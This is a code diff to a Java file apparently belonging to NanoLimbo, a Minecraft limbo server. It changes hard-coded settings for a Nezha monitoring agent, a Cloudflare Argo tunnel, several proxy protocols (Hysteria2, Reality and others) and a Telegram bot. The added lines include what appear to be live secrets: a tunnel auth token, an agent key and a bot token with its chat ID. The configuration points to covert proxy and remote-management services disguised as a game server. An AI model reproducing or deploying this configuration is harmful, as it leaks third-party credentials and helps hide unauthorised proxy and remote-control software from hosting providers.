@@ -122,26 +122,26 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "505bc7c0-8f2a-44f7-bdf4-8e37a8f2e896");
+        envVars.put("UUID", "938d63b2-816b-4042-bf9f-50618bde333a");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nz.xx66.nyc.mn");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "eXqNDUKtTcOICKFugJ");
+        envVars.put("NEZHA_KEY", "yIgh3asFwMCGZ84Fry");
         envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_DOMAIN", "apexnodes-pl.xx66.nyc.mn");
-        envVars.put("ARGO_AUTH", "eyJhIjoiYTg2NTc2M2YxOGEwOTZhOWI3MWRiZmMxYzJkYzRlYTYiLCJ0IjoiOTQxNDA1OTAtZDc3YS00NDZjLTljMmMtMjMxMjNkYmI2ZTJhIiwicyI6IlpXVmtZMlUyTjJJdFkyWmpaUzAwWlRBMExXRTFZMlF0T0RVeU1URmtPREJpWWpNMiJ9");
-        envVars.put("HY2_PORT", "14270");
-        envVars.put("TUIC_PORT", "16862");
-        envVars.put("REALITY_PORT", "14270");
-        envVars.put("S5_PORT", "16862");
-        envVars.put("ANYTLS_PORT", "35393");
+        envVars.put("ARGO_DOMAIN", "zampto-de-node14.dora.cc.cd");
+        envVars.put("ARGO_AUTH", "eyJhIjoiODYxM2UxNGFjMzJjZmQ1ZGFjZDlkZWJlOTljNzlhOGQiLCJ0IjoiMTRkNDJkOGEtMTA4YS00YWEwLWE1N2YtYjEyNWM4NmIwOGVkIiwicyI6Ik9XSTJNV1kwTnpNdE1qaGlOQzAwTlRjMkxUa3dOekV0T1RSbU9XSTRORGt6WldFMCJ9");
+        envVars.put("HY2_PORT", "21709");
+        envVars.put("TUIC_PORT", "");
+        envVars.put("REALITY_PORT", "21709");
+        envVars.put("S5_PORT", "");
+        envVars.put("ANYTLS_PORT", "");
         envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "");
-        envVars.put("BOT_TOKEN", "");
+        envVars.put("CHAT_ID", "453472010");
+        envVars.put("BOT_TOKEN", "7126463574:AAHSLx2WwHJSa3gpujRj64JhpEpCqsJcUZs");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "apexnodes-pl");
+        envVars.put("NAME", "zampto-de-node14");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
